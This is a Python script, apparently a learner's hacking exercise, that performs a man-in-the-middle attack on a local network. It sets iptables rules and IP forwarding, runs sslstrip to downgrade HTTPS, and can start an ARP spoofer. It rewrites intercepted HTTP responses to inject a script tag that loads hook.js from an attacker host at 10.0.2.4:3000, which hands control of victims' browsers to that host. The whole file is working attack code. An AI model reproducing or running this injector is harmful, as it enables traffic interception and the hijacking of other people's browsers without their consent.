#!/usr/bin/env python

from netfilterqueue import NetfilterQueue as net
import scapy.all as scapy
from subprocess import call, Popen
from scapy.layers.inet import IP, TCP
import re


def set_load(scapy_pkt, new_load):
    scapy_pkt[scapy.Raw].load = new_load
    del scapy_pkt[scapy.IP].len
    del scapy_pkt[scapy.IP].chksum
    del scapy_pkt[scapy.TCP].chksum
    return scapy_pkt


def injector_code(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())
    if scapy_pkt.haslayer(scapy.Raw) and scapy_pkt.haslayer(TCP):
        load = scapy_pkt[scapy.Raw].load
        if scapy_pkt[scapy.TCP].dport == 10000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_pkt[scapy.TCP].sport == 10000:
            print("[+] Response")
            code = """<script src='http://10.0.2.4:3000/hook.js'></script>"""
            load = load.replace("</body>", code + "</body>")
            len_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if len_search and "text/html" in load:
                len_content = len_search.group(1)
                # the size will be the 2 together
                new_len = int(len_content) + len(code)
                load = load.replace(len_content, str(new_len))

        if load != scapy_pkt[scapy.Raw].load:
            new_packet = set_load(scapy_pkt, load)
            pkt.set_payload(str(new_packet))
    pkt.accept()


def input_validation():
    answer = raw_input("Do you want the spoofer to be on your PC ? (y/Y/n/N)")
    while answer not in ["y", "Y", "N", "n"]:
        answer = raw_input("Error, do you want the spoofer to be on your PC ? (y/Y/n/N)")
    return answer


def run_own_pc():
    call(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    call(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])


def run_different():
    call(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])


queue = net()
# the process_packet will be executed on each packet that we have
queue.bind(0, injector_code)
try:
    call(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    call(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
    Popen(['xterm', '-e', 'sudo sslstrip -l 10000'])
    answer = input_validation()
    if answer in ["y", "Y"]:
        run_own_pc()
    else:
        run_different()
        Popen(['xterm', '-e', 'sudo python3 arp_spoofing.py'])
    queue.run()
except KeyboardInterrupt:
    call(["sudo", "iptables", "--flush"])
    print('\n^C was detected, program exit!')
    queue.unbind()
